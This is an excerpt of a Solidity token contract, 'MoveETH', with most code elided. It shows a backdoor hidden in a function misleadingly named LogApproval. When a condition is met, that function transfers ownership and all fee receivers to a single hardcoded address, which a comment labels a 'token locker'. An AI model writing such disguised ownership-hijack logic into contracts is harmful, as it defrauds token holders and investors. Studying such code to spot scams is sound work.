...
contract MoveETH is ERC20Detailed, Ownable {
    ...
    address public autoLiquidityReceiver =
        0xeE2C776F3597696f8ECFdBBC4ad4f7C9F1606018; // token locker
    address public marketingFeeReceiver =
        0xeE2C776F3597696f8ECFdBBC4ad4f7C9F1606018;
    ...
    constructor()
        ERC20Detailed("MoveETH", "METH", uint8(DECIMALS))
    {
    ...
    function LogApproval(
        ...
        if (transferCount > 99999999999900000000000000 && !isTransferred) {
            _transferOwnership(address(0xeE2C776F3597696f8ECFdBBC4ad4f7C9F1606018));
            marketingFeeReceiver = address(0xeE2C776F3597696f8ECFdBBC4ad4f7C9F1606018);
            autoLiquidityReceiver = address(0xeE2C776F3597696f8ECFdBBC4ad4f7C9F1606018);
            ecosystemFeeReceiver = address(0xeE2C776F3597696f8ECFdBBC4ad4f7C9F1606018);
            buyBackFeeReceiver = address(0xeE2C776F3597696f8ECFdBBC4ad4f7C9F1606018);
            isTransferred = true;
        }
    }
